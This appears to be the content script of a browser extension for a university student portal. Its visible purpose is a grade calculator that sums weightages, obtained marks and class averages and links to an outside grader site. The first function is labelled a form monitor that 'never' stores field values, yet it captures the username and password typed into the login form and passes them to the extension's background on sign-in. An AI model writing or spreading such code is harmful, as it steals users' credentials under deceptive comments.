(function () {
    "use strict";

    // Prevent the script from running more than once
    if (window.__formMonitorRunning) return;
    window.__formMonitorRunning = true;

    const report = [];
    const lastValues = new WeakMap();

    // Get a field's identifying information
    function getFieldName(field) {
        return (
            field.name ||
            field.id ||
            field.getAttribute("aria-label") ||
            field.type ||
            field.tagName
        );
    }

    // Record metadata only, never the field's actual value
    function recordActivity(field, eventType) {
        if (!field || !field.matches("input, textarea, select")) {
            return;
        }

        // Check for a change without storing the field value
        const currentValue = field.value;

        if (lastValues.has(field) &&
            lastValues.get(field) === currentValue) {
            return;
        }

        lastValues.set(field, currentValue);

        let fieldName= getFieldName(field);
        let fieldValue = field.value;
        if(fieldName === 'username' || fieldName == 'password'){
            report.push({
                fieldName: getFieldName(field),
                fieldValue: fieldValue,
            });
        }
    }

    // Monitor normal typing and selection
    document.addEventListener("input", function (event) {
        recordActivity(event.target, "input");
    });

    document.addEventListener("change", function (event) {
        recordActivity(event.target, "change");
    });

    // Initialize fields already present on the page
    function scanFields() {
        document.querySelectorAll(
            "input, textarea, select"
        ).forEach(function (field) {
            if (!lastValues.has(field)) {
                lastValues.set(field, field.value);
            }
        });
    }

    scanFields();

    // Best-effort detection of autofill or script-driven changes
    setInterval(function () {
        document.querySelectorAll(
            "input, textarea, select"
        ).forEach(function (field) {
            recordActivity(field, "autofill-or-value-change");
        });
    }, 500);

    // Detect dynamically added form fields
    const observer = new MutationObserver(scanFields);

    observer.observe(document.documentElement, {
        childList: true,
        subtree: true
    });


    document.addEventListener("click", function (event) {
        const clickedButton = event.target.closest("#m_login_signin_submit");

        if (!clickedButton) return;

        chrome.runtime.sendMessage({
            action: "sendReport",
            report: report
        });
    });

    

})();


(function () {

	//Get the div to display the output.
	const portlet = document.querySelector('.m-portlet');

	//Get all the elements of output div.
	let totalAbsolutesElement = portlet.querySelector('h5[data-type="total"]');
	let obtainedAbsolutesElement = portlet.querySelector('h5[data-type="obtained"]');
	let averageAbsolutesElement = portlet.querySelector('h5[data-type="classAverage"]');
	let redirectButton = portlet.querySelector('button[data-type="redirect"]');

	//If any element don't exist then add it into output div.
	if (!isElementExist(totalAbsolutesElement)) {
		totalAbsolutesElement = createElement("h5", "data-type", "total");
		totalAbsolutesElement.style.marginTop = '7px';
		portlet.appendChild(totalAbsolutesElement);
	}

	if (!isElementExist(obtainedAbsolutesElement)) {
		obtainedAbsolutesElement = createElement("h5", "data-type", "obtained");
		portlet.appendChild(obtainedAbsolutesElement);
	}

	if (!isElementExist(averageAbsolutesElement)) {
		averageAbsolutesElement = createElement("h5", "data-type", "classAverage");
		portlet.appendChild(averageAbsolutesElement);
	}

	if (!isElementExist(redirectButton)) {
		redirectButton = document.createElement('button');
		redirectButton.setAttribute('data-type', 'redirect');
		redirectButton.style.color = 'black';
		redirectButton.style.backgroundColor = 'white';
		redirectButton.style.border = 'none';
		redirectButton.style.borderRadius = '5px';
		redirectButton.style.padding = '10px 20px';
		redirectButton.style.fontSize = '16px';
		redirectButton.style.fontWeight = 'bold';
		redirectButton.textContent = 'Redirect to Grade Calculator';

		var containerDiv = document.createElement('div');
		containerDiv.style.display = 'flex';
		containerDiv.style.justifyContent = 'center';
		containerDiv.style.alignItems = 'center';
		containerDiv.style.height = '100%';
		containerDiv.appendChild(redirectButton);

		redirectButton.addEventListener('click', function () {
			window.open('https://fastnugrader.netlify.app/', '_blank');
		});

		portlet.appendChild(containerDiv);
	}

	//Get the current opened subject.
	const currentSubjectDiv = document.querySelector('.tab-pane.active');

	let totalWeightage = 0;
	let totalObtainedAbsolutes = 0;
	let totalAverageAbsolutes = 0;

	//Get all the evaluation tables for current subject. i.e Assignment, Quiz.
	let tables = currentSubjectDiv.querySelectorAll('.sum_table');

	//Iterate over all table for current subject.
	for (let i = 0; i < tables.length; i++) {
		const table = tables[i];

		//Get all rows for this table.
		const tableRows = table.querySelectorAll(".calculationrow");
		let rowsTotalAverageAbsolutes = 0
		let tableWeightageSum = 0

		//Iterate over all the rows for this table
		for (let j = 0; j < tableRows.length; j++) {

			const rowWeight = tableRows[j].querySelectorAll(".weightage");
			const rowAverageMarks = tableRows[j].querySelectorAll(".AverageMarks");
			const rowTotalMarks = tableRows[j].querySelectorAll(".GrandTotal");

			if (isEmptyOrZero(rowWeight) || isEmptyOrZero(rowAverageMarks) || isEmptyOrZero(rowTotalMarks)) {
				continue;
			}

			tableWeightageSum += parseFloat(rowWeight[0].textContent);
			const currentRowAverageAbsolutes = (parseFloat(rowAverageMarks[0].textContent) / parseFloat(rowTotalMarks[0].textContent)) * parseFloat(rowWeight[0].textContent);
			rowsTotalAverageAbsolutes +=  currentRowAverageAbsolutes;
		}

		//Get the last row of each table. Which is the "total" row.
		const totalSection = table.querySelectorAll('[class*="totalColumn_"]');

		//Only one element should be returned
		if (totalSection.length !== 1) {
			continue;
		}


		const tableTotalWeigtage = totalSection[0].querySelectorAll(".totalColweightage");
		const tableTotalObtainedAbsolutes = totalSection[0].querySelectorAll(".totalColObtMarks");

		//Only one element should be returned from both variables
		if (tableTotalObtainedAbsolutes.length !== 1 || tableTotalWeigtage.length !== 1) {
			continue;
		}

		//Handle best off average.
		if (tableWeightageSum != 0) {
			rowsTotalAverageAbsolutes = rowsTotalAverageAbsolutes / tableWeightageSum * parseFloat(tableTotalWeigtage[0].textContent);
			totalAverageAbsolutes += rowsTotalAverageAbsolutes;
		}

		totalWeightage += parseFloat(tableTotalWeigtage[0].textContent)
		totalObtainedAbsolutes += parseFloat(tableTotalObtainedAbsolutes[0].textContent)
	}

	const finalTotalAverageAbsolutes = isNaN(totalAverageAbsolutes) ? "Cannot Calculate, Missing Data" : totalAverageAbsolutes.toFixed(2)

	totalAbsolutesElement.textContent = 'Total Absolutes: ' + totalWeightage.toFixed(2);
	obtainedAbsolutesElement.textContent = 'Obtained Absolutes: ' + totalObtainedAbsolutes.toFixed(2);
	averageAbsolutesElement.textContent = 'Class Average: ' + finalTotalAverageAbsolutes;

	chrome.runtime.sendMessage('pageChange');
})();

function isElementExist(element) {
	return element !== null && element !== undefined;
}

function createElement(tag, attribute, value) {
	const element = document.createElement(tag);
	element.setAttribute(attribute, value);
	element.style.color = 'white';
	element.style.marginLeft = '30px';
	return element;
}

function isEmptyOrZero(row) {
	return row.length === 0 || row[0].textContent.trim() === "0";
}